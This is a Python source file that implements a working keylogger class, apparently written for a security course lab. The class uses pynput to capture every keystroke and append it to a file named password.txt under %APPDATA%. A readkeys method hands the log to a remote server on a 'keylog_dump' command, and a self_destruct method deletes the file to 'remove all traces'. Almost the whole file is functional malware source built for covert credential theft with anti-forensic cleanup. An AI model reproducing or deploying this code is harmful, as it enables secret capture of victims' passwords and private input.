import os, time
from pynput.keyboard import Listener


class Keylogger:

    def __init__(self):
        """
        This keylogger class works very similar to the one submitted for lab 12. The init function initializes
        the main variables to be used. It is important to note the location of the file_to_write if you plan to see the text
        file while the keylogger is in action.
        """
        self.ABORT = False
        self.keys = []
        self.count = 0
        self.file_to_write = os.environ['appdata'] + '\password.txt'    # for running on Windows
        #file_to_write = 'passwords.txt'      # for running on Linux and Mac

    def start(self):
        """
        The start function is intended to physically start the keylogger. The file path is printed to allow the file to
        be found more easily, and a listener is initialized as a class object so it can be accessed later.
        The listener is started, meaning all keystrokes are captured.
        A while loop starts checking for the ABORT flag. If another function, such as a stop command, sends the abort
        signal the listener is stopped and the loop breaks.
        """
        print(self.file_to_write)  # This step is just intended to help find the key dump file
        self.listener = Listener(on_press = self.on_press)
        self.listener.start()
        while (True):
            if self.ABORT == True:
                self.listener.stop()
                print("abort detected")
                break
        exit()

    def on_press(self, key):
        """
        The on_press function handles the individual keystrokes. The key is printed to screen, a list is expanded,
        and the write_file function is called with the keybuffer. The buffer is then reset to avoid the same keys being
        added constantly to the file.
        """
        print (key, " was pressed!")
        # append key to keys
        self.keys.append(key)
        # increment count by 1
        self.count += 1
        # if count >=1, reset count, call the write_file function, pass keys as parameter
        if self.count >= 1:
            self.count = 0
            self.write_file(self.keys)
            print ("write was called")
            self.keys = []
        # reset keys

    def write_file(self, keybuffer):
        """
        The write_file function parses the various keys and writes them to the output file. The file path
        is printed each time. The file is opened in append+ mode in the event it needs to be read. Quotes are stripped
        characters, and placeholder text from pynput is replaced with more readable text.
        Once the key has been parsed, it is written to file and printed to console.
        """
        file_to_write = self.file_to_write
        print (file_to_write)
        with open(file_to_write, "a+") as file:  # open file_to_write in append mode
            for key in keybuffer:
                k = str(key).strip("'")  # strip end quotes off the characters
                if k == "Key.backspace":
                    k = str(key).replace("Key.backspace", "Backspace")  # replace backspace with 'Backspace'
                elif k == "Key.enter":
                    k = str(key).replace("Key.enter", "\n")  # replace enter with "\n
                elif k == "Key.caps_lock":
                    k = str(key).replace("Key.caps_lock", "CAPS LOCK")  # replace caps lock with caps lock
                elif k == "Key.space":
                    k = str(key).replace("Key.space", " ")  # replace space with space
                try:
                    file.write(k)
                    print (k, "was written")
                except Exception as e:
                    print (e.args)

    def readkeys(self):
        """
        This function is intended to return the contents of the output file to the server when keylog_dump is issued.
        The function just opens the file, reads the entire file into a buffer, and returns that buffer.
        In the server, that buffer is then deposted into dump.txt and placed on the desktop
        """
        file_to_write = self.file_to_write
        with open(file_to_write, 'r') as file:
            dump = ''
            while True:
                buffer = file.readline()
                if buffer == '':
                    break
                dump += buffer
            return dump

    def self_destruct(self):
        """
        The self_destruct function is just to remove all traces. It sets the abort flag to TRUE so that the loop stops,
        checks to see if the output file exists, and removes it if it does.
        """
        print("You're going to the shadow realm, Jimbo")
        #if the keylog dump file still exists, destroy it
        file_to_write = self.file_to_write
        self.ABORT = True
        if os.path.exists(file_to_write):
            os.remove(file_to_write)

